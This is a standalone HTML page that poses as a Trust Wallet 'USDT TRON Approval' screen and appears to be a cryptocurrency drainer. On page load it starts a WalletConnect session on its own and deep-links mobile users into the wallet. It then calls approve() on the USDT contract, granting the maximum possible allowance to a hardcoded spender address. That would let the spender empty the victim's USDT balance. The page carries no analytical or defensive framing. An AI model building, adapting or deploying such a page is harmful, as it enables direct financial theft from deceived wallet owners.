<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>USDT TRON Approval - Trust Wallet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0b0f14;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 380px;
      background: #111827;
      border-radius: 20px;
      padding: 25px;
      text-align: center;
    }

    .title {
      font-size: 20px;
      margin-bottom: 15px;
      color: #22c55e;
    }

    .address {
      background: #1f2937;
      border-radius: 12px;
      padding: 12px;
      font-family: monospace;
      font-size: 14px;
      word-break: break-all;
      margin: 20px 0;
    }

    .status {
      padding: 12px;
      border-radius: 12px;
      margin-top: 15px;
      font-size: 14px;
      min-height: 50px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .success { background: #22c55e; }
    .pending { background: #f59e0b; }
    .error { background: #ef4444; }
    .connect { background: #3b82f6; }

    .spinner {
      border: 2px solid #374151;
      border-top: 2px solid #22c55e;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      margin-right: 8px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .qr-container {
      background: #1f2937;
      border-radius: 12px;
      padding: 20px;
      margin: 15px 0;
    }

    button {
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      border: none;
      background: #22c55e;
      color: white;
      font-size: 16px;
      cursor: pointer;
      margin-top: 15px;
    }
  </style>
</head>

<body>
  <div class="card">
    <div class="title">Approve Unlimited USDT</div>
    
    <div style="font-size: 14px; margin-bottom: 10px;">Allow spending for:</div>
    
    <div class="address">
      TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV
    </div>

    <div id="status" class="status pending">
      <div class="spinner"></div>
      Open Trust Wallet and approve connection...
    </div>

    <div id="qr-container" class="qr-container" style="display: none;">
      <div>Scan with Trust Wallet</div>
      <div id="qr-code"></div>
    </div>
  </div>

  <script src="https://unpkg.com/@tronweb3/walletconnect-tron@1.0.0/dist/index.umd.js"></script>
  <script src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>

  <script>
    const CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRON
    const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
    const APPROVE_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    let tronWeb = null;
    let walletConnect = null;
    const statusEl = document.getElementById('status');
    const qrContainer = document.getElementById('qr-container');
    const qrCodeEl = document.getElementById('qr-code');

    async function connectTrustWallet() {
      try {
        statusEl.innerHTML = '<div class="spinner"></div>Connecting to Trust Wallet...';
        statusEl.className = 'status pending';

        // Initialize WalletConnect for TRON
        walletConnect = new TronWeb3.WalletConnectTron({
          bridge: "https://bridge.walletconnect.org",
          tronWeb: {
            fullHost: 'https://api.trongrid.io',
            headers: {"TRON-PRO-API-KEY": "your-api-key-optional"}
          }
        });

        const uri = await walletConnect.createSession();
        
        // Show QR code for Trust Wallet scan
        qrContainer.style.display = 'block';
        QRCode.toCanvas(qrCodeEl, uri, { width: 200, margin: 2 });
        
        statusEl.innerHTML = '<div class="spinner"></div>Scan QR code with Trust Wallet';

        // Wait for connection
        walletConnect.on('connect', async (error, payload) => {
          if (error) throw error;
          
          tronWeb = walletConnect.tronWeb;
          statusEl.innerHTML = '<div class="spinner"></div>Connected! Approving unlimited USDT...';
          statusEl.className = 'status pending';
          
          await approveUSDT();
        });

      } catch (error) {
        console.error('Connection failed:', error);
        statusEl.innerHTML = '❌ Connection failed. Open Trust Wallet and try again.';
        statusEl.className = 'status error';
      }
    }

    async function approveUSDT() {
      try {
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        const tx = await contract.approve(SPENDER_ADDRESS, APPROVE_AMOUNT).send({
          feeLimit: 100000000
        });

        statusEl.innerHTML = `✅ APPROVED! <br> Tx: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#22c55e;">${tx.slice(0,10)}...</a>`;
        statusEl.className = 'status success';
        
      } catch (error) {
        console.error('Approval failed:', error);
        statusEl.innerHTML = `❌ ${error.message || 'Approval rejected by user'}`;
        statusEl.className = 'status error';
      }
    }

    // Auto connect when page loads
    window.addEventListener('load', () => {
      setTimeout(connectTrustWallet, 1000);
    });

    // Handle mobile deep linking
    if (/Android|iPhone/i.test(navigator.userAgent)) {
      window.addEventListener('load', () => {
        setTimeout(() => {
          window.location.href = 'trust://wc?uri=' + encodeURIComponent(walletConnect?.uri || '');
        }, 2000);
      });
    }
  </script>
</body>
</html>
